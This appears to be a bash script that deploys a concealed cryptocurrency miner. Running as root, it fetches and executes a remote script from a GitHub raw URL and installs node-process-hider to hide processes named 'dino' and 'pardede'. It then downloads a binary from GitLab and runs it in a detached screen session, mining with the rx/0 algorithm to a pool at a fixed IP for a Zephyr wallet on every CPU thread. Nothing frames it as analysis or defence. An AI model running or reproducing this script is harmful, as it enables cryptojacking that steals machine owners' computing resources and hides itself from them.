#!/bin/bash
sudo su <<EOF
wget -qO winter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/login.sh && chmod +x * && ./winter.sh
sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
sudo apt install screen -y
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
sudo apt install npm -y
sudo npm i -g node-process-hider && sudo ph add dino
sudo ph add pardede
wget https://gitlab.com/sarifadim/jomblo/-/raw/main/pardede && chmod +x *
screen -dms run ./pardede -a rx/0 -o 47.89.195.104:443 -u ZEPHYR3A69RiVrbHPHBBBoLzZDguExerhWkxyYq9xtdb2LoEsqnmfkMdyiDrAcE8vHRdUEsgUU9KpehTPgMSAWaGc3wuGmiKyJr4p.$(echo B-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t $(nproc --all)
EOF
screen -r
